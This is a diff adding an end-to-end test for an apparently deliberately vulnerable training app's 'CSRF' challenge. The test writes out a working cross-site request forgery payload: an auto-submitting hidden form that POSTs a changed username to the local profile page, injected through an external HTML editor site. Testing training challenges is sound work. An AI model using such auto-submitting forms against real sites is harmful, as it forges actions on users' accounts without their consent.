@@ -74,4 +74,18 @@ describe('/profile', () => {
       protractor.expect.challengeSolved({ challenge: 'SSTi' })
     })
   }
+
+  describe('challenge "csrf"', () => {
+    it('should be possible to perform a CSRF attack against the user profile page', () => {
+      browser.waitForAngularEnabled(false)
+      browser.driver.get('http://htmledit.squarefree.com')
+      browser.driver.sleep(1000)
+      /* The script executed below is equivalent to pasting this string into http://htmledit.squarefree.com: */
+      /* <form action="http://localhost:3000/profile" method="POST"><input type="hidden" name="username" value="CSRF"/><input type="submit"/></form><script>document.forms[0].submit();</script> */
+      browser.executeScript("document.getElementsByName('editbox')[0].contentDocument.getElementsByName('ta')[0].value = \"<form action=\\\"http://localhost:3000/profile\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"username\\\" value=\\\"CSRF\\\"/><input type=\\\"submit\\\"/></form><script>document.forms[0].submit();</script>\"")
+      browser.driver.sleep(5000)
+      browser.waitForAngularEnabled(true)
+    })
+    protractor.expect.challengeSolved({ challenge: 'CSRF' })
+  })
 })
